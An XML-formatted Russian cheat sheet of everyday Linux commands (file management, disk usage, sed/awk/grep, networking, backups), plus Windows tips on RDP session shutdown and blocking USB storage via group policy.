      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">whereis</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> - Вывод полных путей к бинарным файлам, файлом исходных кодов и руководств, имеющих отношение к файлу </text:span><text:span text:style-name="T2">ls</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">locate</text:span><text:span text:style-name="T3"> \*.</text:span><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3"> - Поиск всех файлов, содержащих в имени ".</text:span><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3">" по специальной базе данных, предварительно сформированной командой </text:span><text:span text:style-name="T2">updatedb</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">which</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> - Вывести полный путь до файла </text:span><text:span text:style-name="T2">ls</text:span></text:p>
      <text:p text:style-name="P1">Работа с файлами и папками</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">pwd</text:span><text:span text:style-name="T3"> - Вывести текущую директорию</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3"> - Перейти в директорию /</text:span><text:span text:style-name="T2">home</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> .. - Перейти в родительский каталог, то есть подняться на уровень выше</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> ../.. - Подняться в дереве каталогов на два уровня</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> - Перейти в домашний каталог</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> ~</text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3"> - Перейти в домашний каталог пользователя </text:span><text:span text:style-name="T2">user</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> - - Перейти в предыдущую директорию, из которой был сделан переход в текущую директорию</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cp</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">_1 </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">_2 - Копировать директорию </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">_1 в директорию </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">_2</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cp</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">_1 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">_2 - Копировать файл </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">_1 в файл </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">_2</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cp</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3"> . - копировать директорию </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3"> и все ее содержимое в текущую директорию</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cp</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">/* . - Копировать все файлы, содержащиеся в директории </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3"> в текущую директорию</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">iconv</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> - Выводит список доступных для использования кодировок</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">iconv</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">windows</text:span><text:span text:style-name="T3">-1251 -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">utf</text:span><text:span text:style-name="T3">-8 </text:span><text:span text:style-name="T2">inputFile</text:span><text:span text:style-name="T3"> &gt; </text:span><text:span text:style-name="T2">outputFile</text:span><text:span text:style-name="T3"> - Конвертировать файл из кодировки </text:span><text:span text:style-name="T2">windows</text:span><text:span text:style-name="T3">-1251 в кодировку </text:span><text:span text:style-name="T2">utf</text:span><text:span text:style-name="T3">-8</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ln</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">to</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">filedir</text:span><text:span text:style-name="T3"> ./</text:span><text:span text:style-name="T2">link</text:span><text:span text:style-name="T3"> - Создать в текущей директории символическую ссылку </text:span><text:span text:style-name="T2">link</text:span><text:span text:style-name="T3"> на директорию или файл </text:span><text:span text:style-name="T2">filedir</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ln</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">to</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">filedir</text:span><text:span text:style-name="T3"> ./</text:span><text:span text:style-name="T2">link</text:span><text:span text:style-name="T3"> - Создать в текущей директории жесткую ссылку </text:span><text:span text:style-name="T2">link</text:span><text:span text:style-name="T3"> на директорию или файл </text:span><text:span text:style-name="T2">filedir</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> - Вывести листинг содержимого текущей директории</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">F</text:span><text:span text:style-name="T3"> - Листинг текущей директории с добавлением к именам символов, обозначающих тип объекта</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> - Листинг текущей директории с подробностями по каждому объекту ( права доступа, владелец, группа, дата, размер )</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> - Кроме обычных объектов, вывести в листинге, скрытые файлы и директории, текущего каталога</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">pr</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">T</text:span><text:span text:style-name="T3">5 -</text:span><text:span text:style-name="T2">W</text:span><text:span text:style-name="T3">$</text:span><text:span text:style-name="T2">COLUMNS</text:span><text:span text:style-name="T3"> - Листинг директории /</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3"> в 5 колонок</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> *[0-9]* - Вывести в листинг файлов и директорий текущего каталога, содержащие в имени цифровые символы</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">lstree</text:span><text:span text:style-name="T3"> - Листинг иерархии директорий и файлов, начиная с корневого каталога (/)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mkdir</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> - Создать в текущем каталоге, директорию с именем </text:span><text:span text:style-name="T2">dir</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mkdir</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_1 </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_2 - Создать в текущем каталоге две директории, с именами </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_1 и </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_2</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mkdir</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">p</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">to</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> - Создать иерархию директорий. Кроме самой директории </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> будут созданы все промежуточные директории</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mv</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">filedir</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">filedir</text:span><text:span text:style-name="T3"> - Переместить ( переименовать ) файл или директорию из </text:span><text:span text:style-name="T2">filedir</text:span><text:span text:style-name="T3"> в </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">filedir</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">rm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">rf</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> - Рекурсивно удалить директорию </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> и всё её содержимое, без запроса подтверждения на удаление</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">rm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Удалить файл </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">, без запроса подтверждения</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">rm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">rf</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_1 /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_2 - Удалить директории /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_1 и /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">_2 вместе с содержимым, без запроса подтверждения</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">rmdir</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> - Удалить директорию /</text:span><text:span text:style-name="T2">dir</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">tree</text:span><text:span text:style-name="T3"> - Вывести иерархию директорий и файлов, начиная с корневой (/)</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">touch</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> 0712250000 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 - Изменить дату и время создания файла, если указанный файл не существует, создать его с указанными датой и временем (</text:span><text:span text:style-name="T2">YYMMDDhhmm</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P1">Дисковое пространство</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">df</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">h</text:span><text:span text:style-name="T3"> - Вывод информации о свободном и занятом дисковом пространстве на смонтированных разделах, в формате, удобном для чтения</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">dpkg</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">query</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">W</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3">='${</text:span><text:span text:style-name="T2">Installed</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">Size</text:span><text:span text:style-name="T3">;10}</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3">${</text:span><text:span text:style-name="T2">Package</text:span><text:span text:style-name="T3">}</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3">' | </text:span><text:span text:style-name="T2">sort</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">k</text:span><text:span text:style-name="T3">1,1</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> - Выводит объем используемого дискового пространства, занятого файлами </text:span><text:span text:style-name="T2">deb</text:span><text:span text:style-name="T3">-пакета, с сортировкой по размеру (</text:span><text:span text:style-name="T2">ubuntu</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">debian</text:span><text:span text:style-name="T3"> т.п.)</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">du</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">sh</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> - Выводит объем дискового пространства, занимаемый директорией </text:span><text:span text:style-name="T2">dir</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">du</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">sk</text:span><text:span text:style-name="T3"> * | </text:span><text:span text:style-name="T2">sort</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">rn</text:span><text:span text:style-name="T3"> - Выводит листинг файлов и директорий с размером, сортируя его по размеру</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">lSr</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">more</text:span><text:span text:style-name="T3"> - Выводит листинг файлов и директорий, сортируя по возрастанию размера и перенаправляет его в программу </text:span><text:span text:style-name="T2">more</text:span><text:span text:style-name="T3"> для постраничного просмотра</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">rpm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">q</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">qf</text:span><text:span text:style-name="T3"> '%10{</text:span><text:span text:style-name="T2">SIZE</text:span><text:span text:style-name="T3">}</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3">%{</text:span><text:span text:style-name="T2">NAME</text:span><text:span text:style-name="T3">}</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3">' | </text:span><text:span text:style-name="T2">sort</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">k</text:span><text:span text:style-name="T3">1,1</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> - Выводит объем дискового пространства, занимаемого файлами </text:span><text:span text:style-name="T2">rpm</text:span><text:span text:style-name="T3">-пакета, с сортировкой по размеру ( </text:span><text:span text:style-name="T2">fedora</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">redhat</text:span><text:span text:style-name="T3"> и т.п.)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Долгое завершение </text:span><text:span text:style-name="T2">rdp</text:span><text:span text:style-name="T3"> сессии</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Очень часто, долго завершается терминальная сессия. Виноват какой то процесс, долго выполняющий свое закрытие. Чаще всего это - </text:span><text:span text:style-name="T2">SplWOW</text:span><text:span text:style-name="T3">64.</text:span><text:span text:style-name="T2">exe</text:span></text:p>
      <text:p text:style-name="P1">Для его принудительного, быстрого завершения, необходимо добавить ветку реестра</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\SysProcs"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">DWORD</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">SPLWOW</text:span><text:span text:style-name="T3">64.</text:span><text:span text:style-name="T2">EXE</text:span><text:span text:style-name="T3"> = 0</text:span></text:p>
      <text:p text:style-name="P7">Таким же способом добавляется любая программа, которая долго выполняет закрытие.</text:p>
      <text:p text:style-name="P1">Просмотр содержимого файлов</text:p>
      <text:p text:style-name="P1"># cat file1 - Вывести все содержимое файла начиная с первой строки</text:p>
      <text:p text:style-name="P1"># head -2 file1 - Отобразить две первые строки файла</text:p>
      <text:p text:style-name="P1"># tac file1 - Отобразить содержимое файла начиная с последней строки</text:p>
      <text:p text:style-name="P1"># tail -f /var/log/messages - В реальном времени выводить все, что добавляется в файл</text:p>
      <text:p text:style-name="P1"># tail -2 file1 - Вывести две последние строки файла</text:p>
      <text:p text:style-name="P13"># more file1 - Отобразить содержимое файла постранично</text:p>
      <text:p text:style-name="P13"># less file1 - Аналогична команде more но позволяет перемещаться по содержимому вперед и назад</text:p>
      <text:p text:style-name="P1">Полезные команды Linux. Анализ файловой системы</text:p>
      <text:p text:style-name="P1"># badblocks -v /dev/hda1 - Проверить раздел hda1 на наличие bad-блоков</text:p>
      <text:p text:style-name="P1"># fsck /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность linux-файловой системы раздела hda1</text:p>
      <text:p text:style-name="P1"># fsck.ext2 /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы ext2 раздела hda1</text:p>
      <text:p text:style-name="P1"># fsck.msdos /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы fat раздела hda1</text:p>
      <text:p text:style-name="P1"># fsck.vfat /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы fat раздела hda1</text:p>
      <text:p text:style-name="P1"># fsck.ext3 /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы ext3 раздела hda1</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># dosfsck /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы fat, раздела hda1</text:span></text:p>
      <text:p text:style-name="P1"># e2fsck /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы ext2 раздела hda1</text:p>
      <text:p text:style-name="P7"># e2fsck -j /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы ext3 раздела hda1, журнал файловой системы расположен там же</text:p>
      <text:p text:style-name="P1">Манипуляции с текстом</text:p>
      <text:p text:style-name="P1"># cat -n file1 - Вывести содержимое файла, нумеруя выводимые строки</text:p>
      <text:p text:style-name="P1"># cat example.txt | awk 'NR%2==1' - Вывести только не четные строки файла</text:p>
      <text:p text:style-name="P1"># echo a b c | awk '{print $1,$3}' - Вывести первую и третью колонки. Разделение, по-умолчанию, по пробельным символам или символу табуляции</text:p>
      <text:p text:style-name="P1"># echo a b c | awk '{print $1}' - Вывести первую колонку содержимого файла. Разделение, по-умолчанию, по пробельным символам или символу табуляции</text:p>
      <text:p text:style-name="P1"># comm -3 file1 file2 - Сравнить содержимое двух файлов, удаляя строки встречающиеся в обоих файлах</text:p>
      <text:p text:style-name="P1"># comm -1 file1 file2 - Сравнить содержимое двух файлов, не отображая строки принадлежащие файлу file1</text:p>
      <text:p text:style-name="P1"># comm -2 file1 file2 - Сравнить содержимое двух файлов, не отображая строки принадлежащие файлу file2</text:p>
      <text:p text:style-name="P1"># grep [0-9] /var/log/messages - Отобрать и вывести строки содержащие цифровые символы из файла /var/log/messages</text:p>
      <text:p text:style-name="P1"># grep ^Aug /var/log/messages - Отобрать и вывести строки, начинающиеся с сочетания символов "Aug", из файла /var/log/messages</text:p>
      <text:p text:style-name="P1"># grep Aug /var/log/messages - Отобрать и вывести строки, содержащие сочетание символов "Aug" из файла /var/log/messages</text:p>
      <text:p text:style-name="P1"># grep Aug -R /var/log/* - Отобрать и вывести строки, содержащие сочетание символов "Aug", из всех файлов, расположенных в директории /var/log и ниже</text:p>
      <text:p text:style-name="P13"># paste -d '+' file1 file2 - Объединить содержимое file1 и file2 в виде таблицы с разделителем "+"</text:p>
      <text:p text:style-name="P13"># paste file1 file2 - Объединить содержимое file1 и file2 в виде таблицы: строка 1 из file1 = строка 1 колонка 1-n, строка 1 из file2 = строка 1 колонка n+1-m</text:p>
      <text:p text:style-name="P1"># sdiff file1 file2 - Сравнить содержимое двух файлов</text:p>
      <text:p text:style-name="P1"># sed 's/string1/string2/g' example.txt - Заменить string1 на string2 в файле example.txt и вывести содержимое</text:p>
      <text:p text:style-name="P1"># sed '/ *#/d; /^$/d' example.txt - Удалить пустые строки и комментарии из файла example.txt</text:p>
      <text:p text:style-name="P1"># sed '/^$/d' example.txt - Удалить пустые строки и комментарии из файла example.txt</text:p>
      <text:p text:style-name="P1"># sed -e '1d' exampe.txt - Удалить первую строку из файла example.txt</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># sed -n '/string1/p' - Отобразить только строки содержащие string1</text:span></text:p>
      <text:p text:style-name="P1"># sed -e 's/string//g' example.txt - Удалить строку string1 из текста файла example.txt не изменяя всего остального</text:p>
      <text:p text:style-name="P1"># sed -e 's/ *$//' example.txt - Удалить пустые символы в конце каждой строки файла example.txt</text:p>
      <text:p text:style-name="P1"># sed -n '5p;5q' example.txt - Вывести пятую строку</text:p>
      <text:p text:style-name="P1"># sed -n '2,5p' example.txt - Вывести строки со второй по пятую</text:p>
      <text:p text:style-name="P1"># sed -e 's/00*/0/g' example.txt - Заменить последовательность из любого количества нулей одним нулём</text:p>
      <text:p text:style-name="P1"># sort file1 file2 - Вывести отсортированное содержимое двух файлов</text:p>
      <text:p text:style-name="P1"># sort file1 file2 | uniq - Вывести отсортированное содержимое двух файлов исключая повторные значения</text:p>
      <text:p text:style-name="P1"># sort file1 file2 | uniq -u - Вывести уникальные значения из отсортированного содержимого двух файлов</text:p>
      <text:p text:style-name="P1"># sort file1 file2 | uniq -d - Вывести только повторяющиеся значения из отсортированного содержимого двух файлов</text:p>
      <text:p text:style-name="P7"># echo 'word' | tr '[:lower:]' '[:upper:]' - Перевести символы нижнего регистра в верхний</text:p>
      <text:p text:style-name="P1">Сети (LAN / WiFi)</text:p>
      <text:p text:style-name="P1"># dhclient eth0 - Включить DHCP на сетевом интерфейсе eth0</text:p>
      <text:p text:style-name="P1"># ethtool eth0 - Вывод статистики по сетевому интерфейсу eth0</text:p>
      <text:p text:style-name="P1"># hostname - Вывести имя компьютера</text:p>
      <text:p text:style-name="P1"># host www.example.com - Преобразовать домен www.example.org в ip-адрес и наоборот</text:p>
      <text:p text:style-name="P1"># ifconfig eth0 - Вывести настройки сетевой карты eth0</text:p>
      <text:p text:style-name="P1"># ifconfig eth0 promisc - Переключить интерфейс eth0 в promiscuous-режим для сбора ( сниффинг ) сетевых пакетов</text:p>
      <text:p text:style-name="P1"># ifup eth0 - Включить сетевой интерфейс eth0</text:p>
      <text:p text:style-name="P1"># ifdown eth0 - Отключить сетевой интерфейс eth0</text:p>
      <text:p text:style-name="P1"># ifconfig eth0 192.168.1.1 netmask 255.255.255.0 - Назначить IP адрес и маску сетевому интерфейсу eth0</text:p>
      <text:p text:style-name="P1"># ip link show - Вывести статус связи всех сетевых интерфейсов</text:p>
      <text:p text:style-name="P13"># iwconfig eth1 - Вывести конфигурацию беспроводного сетевого интерфейса eth1</text:p>
      <text:p text:style-name="P13"># iwlist scan - Сканирование и поиск беспроводных сетей и точек доступа</text:p>
      <text:p text:style-name="P1"># mii-tool eth0 - Вывести состояние связи сетевого интерфейса eth0</text:p>
      <text:p text:style-name="P1"># nslookup www.example.com - Ресольвить ( преобразовать/разрешить ) доменное имя www.example.org в ip-адрес и наоборот</text:p>
      <text:p text:style-name="P1"># route -n - Песать локальной таблицы маршрутизации</text:p>
      <text:p text:style-name="P1"># route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 - Добавить статический маршрут в сеть 192.168.0.0/16 через шлюз с ip-адресом 192.168.1.1</text:p>
      <text:p text:style-name="P1"># route add -net 0/0 gw IP_Gateway - Назначить ip-адрес шлюза по умолчанию ( default gateway )</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># route del 0/0 gw IP_gateway - Удалить ip-адрес шлюза по умолчанию ( default gateway )</text:span></text:p>
      <text:p text:style-name="P1"># netstat -tup - Выводит листинг всех установленных соединений по протоколам TCP и UDP без разрешения имён в ip-адреса а так-же PID'ы и имена процессов, обслуживающих данные соединения</text:p>
      <text:p text:style-name="P1"># netstat -tupl - Вывод списка соединений по протоколам TCP и UDP без разрешения имён в ip-адреса а так-же и PID'ы и имена процессов, ожидающих соединений на сетевых портах</text:p>
      <text:p text:style-name="P1"># netstat -rn - Вывести таблицу маршрутизации, аналог команды route -n</text:p>
      <text:p text:style-name="P1"># echo "1" &gt; /proc/sys/net/ipv4/ip_forward - Разрешить форвардинг ( пересылку ) пакетов</text:p>
      <text:p text:style-name="P1"># tcpdump tcp port 80 - Отлавливать и выводить весь трафик на TCP-порт 80 (обычно - HTTP)</text:p>
      <text:p text:style-name="P7"># whois www.example.com - Вывести информацию о доменном имени из базы данных whois</text:p>
      <text:p text:style-name="P1">Как блокировать USB-накопители в Windows?</text:p>
      <text:p text:style-name="P1">Если вам требуется, чтобы к компьютеру никто не мог подключить USB-накопители, вы можете запретить использование флешек, карт памяти и жестких дисков используя встроенные средства системы. Мышки, клавиатуры и другая периферия, не являющаяся хранилищем, продолжат свою работу.</text:p>
      <text:p text:style-name="P1">Для этого воспользуйтесь редактором локальной групповой политики:</text:p>
      <text:p text:style-name="P1">1. Нажмите «Win+R» и в поле введите команду «gpedit.msc», чтобы запустить редактор.</text:p>
      <text:p text:style-name="P1">2. Если требуется запретить использование USB накопителей для всех пользователей компьютера, перейдите к разделу «Конфигурация компьютера». Если требуется заблокировать доступ только для текущего пользователя, выберите «Конфигурация пользователя».</text:p>
      <text:p text:style-name="P1">3. В выбранном разделе откройте «Административные шаблоны» → «Система» → «Доступ к съемным запоминающим устройствам».</text:p>
      <text:p text:style-name="P1">4. Откройте параметр «Съемные запоминающиеся устройства всех классов: Запретить любой доступ» и установите значение «Включено» и тапните «Применить».</text:p>
      <text:p text:style-name="P16">На этом процесс будет завершен, а доступ к USB заблокирован. Перезагрузка компьютера не требуется, однако, если на момент включения ограничений накопитель уже был подключен, изменения для него вступят в силу только после отключения и повторного подключения.</text:p>
      <text:p text:style-name="P13">Резервное копирование</text:p>
      <text:p text:style-name="P1"># find /var/log -name '*.log' | tar cv --files-from=- | bzip2 &gt; log.tar.bz2 - Поиск всех файлов, заканчивающихся на ".log" в директории /var/log, и упаковка их в bzip-архив</text:p>
      <text:p text:style-name="P1"># find /home/user -name '*.txt' | xargs cp -av --target-directory=/home/backup/ --parents - Поиск в директории /home/user файлов, имена которых оканчиваются на ".txt", и копирование их в другую директорию</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># rsync -rogpav --delete /home /tmp - Синхронизировать директории /tmp и /home</text:span></text:p>
      <text:p text:style-name="P1"># rsync -az -e ssh --delete ip_addr:/home/public /home/local - Синхронизировать локальную и удаленную директории через ssh туннель используя сжатие</text:p>
